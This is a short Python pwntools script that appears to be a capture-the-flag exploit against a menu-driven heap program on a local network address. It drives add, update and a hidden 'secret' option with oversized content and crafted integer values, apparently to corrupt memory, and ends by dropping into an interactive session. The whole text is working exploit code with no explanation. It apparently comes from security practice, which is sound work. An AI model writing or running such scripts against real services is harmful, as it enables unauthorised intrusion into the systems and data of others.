from pwn import *

HOST = "192.168.0.13"
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.0.13',PORT)
def add(size, dat, dat_id):
  s.recvuntil("Choice:")
  s.sendline("1")
  s.recvuntil("Size:")
  s.sendline(str(size))
  s.recvuntil("Content:")
  s.send(dat)
  s.recvuntil("ID:")
  s.sendline(str(dat_id))
def update(idx, dat, dat_id):
  s.recvuntil("Choice:")
  s.sendline("3")
  s.recvuntil("Index:")
  s.sendline(str(idx))
  s.recvuntil("New Content:")
  s.send(dat)
  s.recvuntil("New ID:")
  s.sendline(str(dat_id))  
def secret(num):
  s.recvuntil("Choice:")
  s.sendline("666")
  s.recvuntil("Lucky Number:")
  s.sendline(str(num))
raw_input("d")
add(16,"A"*8,-1)
secret(0x0c047fff8004)
update(0,"A"*0x12,31354989131639)
update(0, 'w'*24, 8446744073709551615)
s.interactive()

